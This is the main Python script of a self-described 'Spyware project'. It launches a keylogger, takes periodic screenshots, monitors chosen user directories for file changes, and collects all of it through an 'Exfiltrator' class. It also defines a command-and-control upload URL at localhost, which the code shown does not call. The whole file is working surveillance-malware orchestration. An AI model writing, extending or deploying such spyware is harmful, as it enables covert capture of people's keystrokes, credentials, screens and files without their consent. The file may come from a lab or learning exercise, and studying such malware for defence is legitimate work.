import time
import threading
import os
import datetime

from modules.keylogger import Keylogger
from modules.screenshot import Screenshot
from modules.file_monitor import FileMonitor
from exfiltrator import Exfiltrator

# --- Configuration ---
SCREENSHOT_INTERVAL = 60
COLLECTION_INTERVAL = 30
MONITORED_DIRECTORIES = ["/Users/damacm1126/test_docs", "/Users/damacm1126/my_projects"]
C2_SERVER_URL = "http://localhost:8000/upload"

# --- Data Storage Paths ---
LOG_DIR = "data"
SCREENSHOT_TEMP_DIR = os.path.join(LOG_DIR, "temp_screenshots")
KEYLOGS_OUTPUT_FILE = os.path.join(LOG_DIR, "keylogs_master.log")
SCREENSHOTS_OUTPUT_DIR = os.path.join(LOG_DIR, "exfiltrated_screenshots")
FILE_CHANGES_OUTPUT_FILE = os.path.join(LOG_DIR, "file_changes_master.log")

# Ensure all necessary data directories exist
os.makedirs(LOG_DIR, exist_ok=True)
os.makedirs(SCREENSHOT_TEMP_DIR, exist_ok=True)
os.makedirs(SCREENSHOTS_OUTPUT_DIR, exist_ok=True)


# --- Global Variables ---
keylogger_instance = None
file_monitor_instance = None
exfiltrator_instance = None

def start_keylogger():
    global keylogger_instance
    keylogger_instance = Keylogger()
    print(f"[{datetime.datetime.now()}] Starting Keylogger...")
    keylogger_instance.start()
    print(f"[{datetime.datetime.now()}] Keylogger started. Logs collected in-memory, then saved to '{KEYLOGS_OUTPUT_FILE}'.")


def start_file_monitor():
    global file_monitor_instance
    print(f"[{datetime.datetime.now()}] Starting File Monitor for: {MONITORED_DIRECTORIES}...")
    file_monitor_instance = FileMonitor(MONITORED_DIRECTORIES)
    for d in MONITORED_DIRECTORIES:
        if not os.path.isdir(d):
            print(f"Warning: Directory does not exist and will not be monitored: {d}")
    file_monitor_instance.start()
    print(f"[{datetime.datetime.now()}] File Monitor started. Changes collected in-memory, then saved to '{FILE_CHANGES_OUTPUT_FILE}'.")


def collect_and_save_data_locally():
    global keylogger_instance, file_monitor_instance, exfiltrator_instance

    if not exfiltrator_instance:
        exfiltrator_instance = Exfiltrator(
            keylogs_output_file=KEYLOGS_OUTPUT_FILE,
            screenshots_output_dir=SCREENSHOTS_OUTPUT_DIR,
            file_changes_output_file=FILE_CHANGES_OUTPUT_FILE
        )

    # Save Keylogs
    if keylogger_instance:
        logged_keys = keylogger_instance.get_logs()
        if logged_keys:
            print(f"[{datetime.datetime.now()}] Collected keylogs. Attempting to save locally...")
            if exfiltrator_instance.save_keylogs_locally(logged_keys):
                keylogger_instance.clear_logs()
        else:
            print(f"[{datetime.datetime.now()}] No new keylogs to save.")

    # Save Screenshots
    screenshot_files = [os.path.join(SCREENSHOT_TEMP_DIR, f) for f in os.listdir(SCREENSHOT_TEMP_DIR) if f.endswith(".png")]
    if screenshot_files:
        print(f"[{datetime.datetime.now()}] Collected {len(screenshot_files)} screenshots. Attempting to save locally...")
        for screenshot_file_path in screenshot_files:
            if exfiltrator_instance.save_screenshot_locally(screenshot_file_path):
                pass
            else:
                print(f"[{datetime.datetime.now()}] Failed to save screenshot {screenshot_file_path} locally. Keeping for next attempt.")
    else:
        print(f"[{datetime.datetime.now()}] No new screenshots to save.")

    # Save File Monitor Logs
    if file_monitor_instance:
        file_changes = file_monitor_instance.get_logs()
        if file_changes:
            print(f"[{datetime.datetime.now()}] Collected file change logs. Attempting to save locally...")
            if exfiltrator_instance.save_file_changes_locally(file_changes):
                file_monitor_instance.clear_logs()
        else:
            print(f"[{datetime.datetime.now()}] No new file changes to save.")

    threading.Timer(COLLECTION_INTERVAL, collect_and_save_data_locally).start()

def take_screenshots_periodically():
    """
    Takes screenshots at a defined interval.
    """
    # --- FIX: Initialize screenshot_instance ONCE outside the loop ---
    screenshot_instance = Screenshot(save_dir=SCREENSHOT_TEMP_DIR)
    print(f"[{datetime.datetime.now()}] Screenshot module initialized. Screenshots will be saved temporarily to: {SCREENSHOT_TEMP_DIR}")
    print(f"[{datetime.datetime.now()}] Starting periodic screenshots...")
    while True:
        try:
            screenshot_path = screenshot_instance.take_screenshot()
            if screenshot_path:
                print(f"[{datetime.datetime.now()}] Screenshot taken: {screenshot_path}")
        except Exception as e:
            print(f"[{datetime.datetime.now()}] Error taking screenshot: {e}")
            if "No such file or directory: 'gnome-screenshot'" in str(e) or "Please ensure you have a suitable backend installed" in str(e):
                print("Please ensure you have a suitable backend installed for pyscreenshot (e.g., 'mss' or 'Pillow' for macOS).")
        time.sleep(SCREENSHOT_INTERVAL)

def main():
    print(f"[{datetime.datetime.now()}] Spyware project started.")

    print("\n--- ATTENTION ---")
    print("If you are on macOS, the keylogger and screenshot modules require Accessibility permissions.")
    print("Please go to System Settings > Privacy & Security > Accessibility, find your Python executable")
    print("(e.g., /path/to/your/.venv/bin/python) and grant it permission.")
    print("-----------------\n")

    keylogger_thread = threading.Thread(target=start_keylogger, daemon=True)
    keylogger_thread.start()

    file_monitor_thread = threading.Thread(target=start_file_monitor, daemon=True)
    file_monitor_thread.start()

    screenshot_thread = threading.Thread(target=take_screenshots_periodically, daemon=True)
    screenshot_thread.start()

    collect_and_save_data_locally()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"[{datetime.datetime.now()}] Ctrl+C detected. Shutting down.")
    finally:
        print(f"[{datetime.datetime.now()}] Spyware project stopped.")
        if keylogger_instance:
            keylogger_instance.stop()
        if file_monitor_instance:
            file_monitor_instance.stop()
        if exfiltrator_instance:
            print(f"[{datetime.datetime.now()}] Attempting final flush of collected data...")

if __name__ == "__main__":
    main()